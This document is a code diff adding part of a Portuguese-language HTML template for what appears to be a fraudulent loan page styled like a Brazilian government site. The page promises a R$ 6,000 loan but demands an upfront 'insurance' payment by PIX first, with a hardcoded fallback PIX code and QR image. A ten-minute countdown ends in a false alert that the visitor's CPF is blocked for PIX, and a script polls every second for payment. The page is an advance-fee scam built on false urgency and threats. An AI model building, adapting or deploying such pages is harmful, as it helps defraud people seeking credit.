+            <!-- Informações do Empréstimo -->
+            <div class="qr-container" style="text-align: left; background-color: white; padding: 1.5rem; border-radius: 8px; margin-top: 1.5rem; width: 100%; max-width: 800px; margin-left: auto; margin-right: auto;">
+                <h3 style="font-weight: 700; font-size: 1.2rem; color: #1351b4; margin-bottom: 20px; text-align: center;">INFORMAÇÕES DO EMPRÉSTIMO</h3>
+                
+                <div style="background-color: #f5f8ff; padding: 20px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 20px;">
+                    <div style="margin-bottom: 15px;">
+                        <div style="font-weight: 600; color: #1351b4; margin-bottom: 5px;">Valor do Empréstimo:</div>
+                        <div style="font-size: 1.2rem; font-weight: 700; color: #28a745;" id="loanAmountText">R$ 6.000,00</div>
+                    </div>
+                    
+                    <div style="margin-bottom: 15px;">
+                        <div style="font-weight: 600; color: #1351b4; margin-bottom: 5px;">Dados Bancários:</div>
+                        <div style="font-size: 1rem;">
+                            <div style="margin-bottom: 5px;"><strong>Banco:</strong> <span id="selectedBank">CAIXA ECONÔMICA FEDERAL</span></div>
+                            <div style="margin-bottom: 5px;"><strong>Chave PIX:</strong> <span id="pixKeyText">(11) 92213-1103</span></div>
+                            <div><strong>Tipo de Chave:</strong> <span id="pixKeyTypeText">Telefone</span></div>
+                        </div>
+                    </div>
+                    
+                    <div>
+                        <div style="font-weight: 600; color: #1351b4; margin-bottom: 5px;">Prazo:</div>
+                        <div style="font-size: 1rem;">O valor será depositado em sua conta após a confirmação do pagamento do seguro prestamista.</div>
+                    </div>
+                </div>
+                
+                <div style="background-color: #fef9e7; padding: 15px; border-radius: 8px; border-left: 4px solid #f39c12;">
+                    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+                        <i class="fas fa-info-circle" style="color: #f39c12; font-size: 1.2rem; margin-right: 10px;"></i>
+                        <div style="font-weight: 600; color: #f39c12;">Importante:</div>
+                    </div>
+                    <p style="margin: 0; line-height: 1.4;">Após o pagamento do seguro, o valor de <strong id="loanAmountText2">R$ 6.000,00</strong> será depositado em até <strong>5 minutos</strong> na conta vinculada ao CPF <strong id="userCpfText">{{ cpf }}</strong>.</p>
+                </div>
+
+                <script>
+                    document.addEventListener('DOMContentLoaded', function() {
+                        // Load data from localStorage
+                        const loanData = JSON.parse(localStorage.getItem('loanData') || '{"amount":"6000","monthly":"68","term":"90"}');
+                        const userData = JSON.parse(localStorage.getItem('userData') || '{"nome":"","cpf":"","loanValue":"6000","phone":""}');
+                        const selectedBank = localStorage.getItem('selectedBank') || 'CAIXA ECONÔMICA FEDERAL';
+                        const pixKey = localStorage.getItem('pixKey') || userData.cpf;
+                        
+                        // Format loan amount
+                        const formattedAmount = `R$ ${Number(loanData.amount).toLocaleString('pt-BR', {minimumFractionDigits: 2})}`;
+                        
+                        // Obtenha o tipo REAL da chave a partir do localStorage
+                        const pixKeyType = localStorage.getItem('pixKeyType') || 'cpf';
+                        const pixKeyTypeText = localStorage.getItem('pixKeyTypeText') || 'CPF';
+                        
+                        // Logging para depuração
+                        console.log("Dados obtidos do localStorage - Tipo:", pixKeyType, "Texto:", pixKeyTypeText, "Chave:", pixKey);
+                        
+                        // Format the PIX key based on its type
+                        let formattedPixKey = pixKey;
+                        
+                        // Força a atualização do tipo de chave no texto
+                        document.getElementById('pixKeyTypeText').textContent = pixKeyTypeText;
+                        
+                        if (pixKeyType === 'phone' && pixKey && pixKey.length >= 10) {
+                            // Format phone number with standard format (61) 98213-2603
+                            // Make sure to handle any formatting issues
+                            const cleanedPhone = pixKey.replace(/\D/g, ''); // Remove non-digits
+                            formattedPixKey = `(${cleanedPhone.slice(0,2)}) ${cleanedPhone.slice(2,7)}-${cleanedPhone.slice(7)}`;
+                        } else if (pixKeyType === 'cpf') {
+                            // Se o tipo da chave for CPF, vamos usar a chave do usuário ou o CPF do userData
+                            const cpfValue = pixKey || userData.cpf;
+                            if (cpfValue && cpfValue.length > 0) {
+                                // Limpar o CPF e aplicar formatação XXX.XXX.XXX-XX
+                                const cleanedCpf = cpfValue.replace(/\D/g, '');
+                                if (cleanedCpf.length === 11) {
+                                    formattedPixKey = `${cleanedCpf.slice(0,3)}.${cleanedCpf.slice(3,6)}.${cleanedCpf.slice(6,9)}-${cleanedCpf.slice(9,11)}`;
+                                } else {
+                                    formattedPixKey = cleanedCpf; // Se não tiver 11 dígitos, mantenha sem formatação
+                                }
+                            }
+                        }
+                        
+                        // Update elements
+                        document.getElementById('loanAmountText').textContent = formattedAmount;
+                        document.getElementById('loanAmountText2').textContent = formattedAmount;
+                        document.getElementById('selectedBank').textContent = selectedBank;
+                        document.getElementById('userCpfText').textContent = userData.cpf;
+                        document.getElementById('pixKeyText').textContent = formattedPixKey;
+                        // O tipo de chave já foi definido acima, não precisamos definir novamente
+                        // document.getElementById('pixKeyTypeText').textContent = pixKeyTypeText;
+                    });
+                </script>
+            </div>
+
+            <!-- Importante - Aguardando pagamento -->
+            <div style="margin: 20px 0; background-color: #f8f9fa; border: 1px solid #dee2e6; border-radius: 8px; padding: 20px; max-width: 600px; margin-left: auto; margin-right: auto; text-align: center;">
+                <h3 style="font-weight: 700; font-size: 1.2rem; color: #1351b4; margin-bottom: 15px;">IMPORTANTE:</h3>
+                <p style="margin-bottom: 15px; font-weight: 500;">Após o pagamento do seguro, seu empréstimo será liberado em até 24h úteis.</p>
+                
+                <!-- Loader animado e status -->
+                <div style="margin: 20px auto; text-align: center; border-top: 1px dashed #dee2e6; padding-top: 20px;">
+                    <div class="loading-spinner" style="width: 40px; height: 40px; border: 4px solid rgba(19, 81, 180, 0.3); border-radius: 50%; border-top: 4px solid #1351b4; margin: 0 auto; animation: spin 1s linear infinite;"></div>
+                    <p style="margin-top: 15px; font-weight: 700; color: #1351b4; letter-spacing: 1px;">AGUARDANDO PAGAMENTO</p>
+                </div>
+            </div>
+
+            <div style="margin: 20px 0; display: flex; flex-direction: column; align-items: center;">
+                <div style="display: flex; justify-content: center; margin-bottom: 20px;">
+                    <div style="text-align: center;">
+                        <p style="margin-bottom: 15px; font-weight: 600; color: #1351b4; text-align: center;">QR Code PIX</p>
+                        <img id="pixQrCode" src="{{ qr_code }}" alt="QR Code PIX" style="width: 200px; height: 200px; border: 1px solid #ddd; border-radius: 8px; padding: 10px; background: white; margin: 0 auto 20px;">
+                    </div>
+                </div>
+                
+                <p style="margin-bottom: 15px; font-weight: 600; color: #1351b4; text-align: center;">Ou copie o código PIX</p>
+                
+                <div style="width: 100%; max-width: 600px; margin: 0 auto;">
+                    <div id="pixCode" class="pix-code" style="word-break: break-all; font-size: 14px; background-color: #f5f5f5; padding: 15px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 15px; max-height: 100px; overflow-y: auto;">
+                        {{ pix_code }}
+                    </div>
+                    
+                    <button onclick="copyPixCode()" class="copy-button" style="background-color: #4FB04B; color: white; border: none; border-radius: 4px; padding: 10px 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; margin: 0 auto; transition: all 0.3s ease;">
+                        <i class="fas fa-copy" style="margin-right: 8px;"></i>
+                        Copiar código PIX
+                    </button>
+                </div>
+                
+                <div style="margin-top: 40px; background-color: #f9f9f9; border-radius: 8px; border: 1px solid #e0e0e0; padding: 20px; max-width: 600px; margin-left: auto; margin-right: auto;">
+                    <h3 style="color: #1351b4; text-align: center; margin-bottom: 15px; font-size: 1.1rem;">COMO PAGAR COM PIX COPIA E COLA</h3>
+                    <ol style="padding-left: 20px; margin-bottom: 0;">
+                        <li style="margin-bottom: 10px; line-height: 1.4;">Abra o aplicativo do seu banco ou instituição financeira</li>
+                        <li style="margin-bottom: 10px; line-height: 1.4;">Acesse a área PIX do aplicativo</li>
+                        <li style="margin-bottom: 10px; line-height: 1.4;">Selecione a opção "PIX Copia e Cola" ou "Pix QR Code"</li>
+                        <li style="margin-bottom: 10px; line-height: 1.4;">Cole o código PIX que você copiou acima</li>
+                        <li style="margin-bottom: 10px; line-height: 1.4;">Finalize o pagamento conforme instruções do seu banco</li>
+                        <li style="margin-bottom: 0; line-height: 1.4;">O pagamento será processado e seu empréstimo será liberado automaticamente</li>
+                    </ol>
+                </div>
+                
+                <script>
+                    // Código PIX de fallback (apenas para demonstração)
+                    const fallbackPixCode = "00020126870014br.gov.bcb.pix2565pix.primepag.com.br/qr/v3/at/cf353572-41fd-4646-ad5e-eee21082791c5204000053039865802BR5925PAGAMENTO SEGURO INTERMED6006SOBRAL62070503***63043384";
+                    const fallbackQrCode = "data:image/png;base64,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";
+
+                    // Verificar e ajustar o código PIX e QR code
+                    document.addEventListener('DOMContentLoaded', function() {
+                        const pixCodeElement = document.getElementById('pixCode');
+                        const pixQrCodeElement = document.getElementById('pixQrCode');
+                        
+                        if (pixCodeElement) {
+                            console.log("Código PIX encontrado na página, comprimento: " + pixCodeElement.textContent.trim().length);
+                            
+                            // Se o código PIX estiver vazio ou muito curto, usar o fallback
+                            if (!pixCodeElement.textContent.trim() || pixCodeElement.textContent.trim().length < 10) {
+                                console.log("Código PIX inválido, usando fallback");
+                                pixCodeElement.textContent = fallbackPixCode;
+                            }
+                            
+                            // Destacar que este código pode ser copiado
+                            pixCodeElement.setAttribute('title', 'Clique no botão abaixo para copiar este código');
+                        }
+                        
+                        if (pixQrCodeElement) {
+                            // Se o QR code estiver vazio, usar o fallback
+                            if (!pixQrCodeElement.src || pixQrCodeElement.src === 'data:,' || pixQrCodeElement.src.length < 100) {
+                                console.log("QR Code inválido, usando fallback");
+                                pixQrCodeElement.src = fallbackQrCode;
+                            } else {
+                                console.log("QR Code encontrado, verificando formato...");
+                                // Se o QR code não for uma imagem válida, forçar o uso do fallback
+                                const img = new Image();
+                                img.onerror = function() {
+                                    console.log("QR Code não é uma imagem válida, usando fallback");
+                                    pixQrCodeElement.src = fallbackQrCode;
+                                };
+                                img.src = pixQrCodeElement.src;
+                            }
+                        }
+                    });
+                </script>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p>© Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                let transactionId = '{{ transaction_id }}';
+                let checkInterval;
+
+                // Timer functionality
+                let timeLeft = 10 * 60; // 10 minutes in seconds
+                const timerDisplay = document.getElementById('timer');
+
+                const countdown = setInterval(() => {
+                    const minutes = Math.floor(timeLeft / 60);
+                    const seconds = timeLeft % 60;
+                    timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+                    if (timeLeft <= 0) {
+                        clearInterval(countdown);
+                        clearInterval(checkInterval);
+                        timerDisplay.textContent = "00:00";
+                        alert("Tempo expirado! Seu CPF foi bloqueado para operações PIX.");
+                        window.location.href = '/';
+                    }
+                    timeLeft--;
+                }, 1000);
+
+                function checkPaymentStatus() {
+                    console.log('Verificando status do pagamento:', transactionId);
+                    fetch(`/check-payment-status/${transactionId}`)
+                        .then(response => {
+                            if (!response.ok) {
+                                throw new Error('Network response was not ok');
+                            }
+                            return response.json();
+                        })
+                        .then(data => {
+                            console.log('Resposta do status do pagamento:', data);
+
+                            if (data.status === 'completed' || data.original_status === 'APPROVED' || data.original_status === 'PAID') {
+                                console.log('Pagamento aprovado, redirecionando imediatamente...');
+                                // Store user data first
+                                const userData = {
+                                    nome: '{{ nome }}',
+                                    cpf: '{{ cpf }}'
+                                };
+                                localStorage.setItem('userData', JSON.stringify(userData));
+
+                                // Clear intervals immediately
+                                clearInterval(checkInterval);
+                                clearInterval(countdown);
+
+                                // Force immediate redirect
+                                window.location.replace('/obrigado');
+                                return; // Exit the function immediately
+                            }
+                            console.log('Pagamento ainda pendente. Status:', data.original_status);
+                        })
+                        .catch(error => {
+                            console.error('Erro ao verificar status:', error);
+                        });
+                }
+
+                // Check status more frequently - every 1 second
+                checkInterval = setInterval(checkPaymentStatus, 1000);
+
+                // Initial check
+                checkPaymentStatus();
+
+                // Show content and hide loading screen after a short delay
+                setTimeout(() => {
+                    document.getElementById('loadingScreen').style.display = 'none';
+                    document.getElementById('mainContent').style.display = 'block';
+                }, 1500);
+
+                // Copy PIX code functionality
+                window.copyPixCode = function() {
+                    const pixCode = document.getElementById('pixCode').textContent.trim();
+                    const copyButton = document.querySelector('.copy-button');
+
+                    navigator.clipboard.writeText(pixCode).then(
+                        function() {
+                            copyButton.innerHTML = '<i class="fas fa-check"></i> Código Copiado!';
+                            copyButton.style.backgroundColor = '#28a745';
+                            setTimeout(() => {
+                                copyButton.innerHTML = '<i class="fas fa-copy"></i> Copiar código PIX';
+                                copyButton.style.backgroundColor = '#4FB04B';
+                            }, 2000);
+                        },
+                        function(err) {
+                            console.error('Erro ao copiar:', err);
+                            copyButton.innerHTML = '<i class="fas fa-times"></i> Erro ao copiar';
+                            copyButton.style.backgroundColor = '#dc3545';
+                        }
+                    );
+                }
+            });
+        </script>
+</body>
+</html>
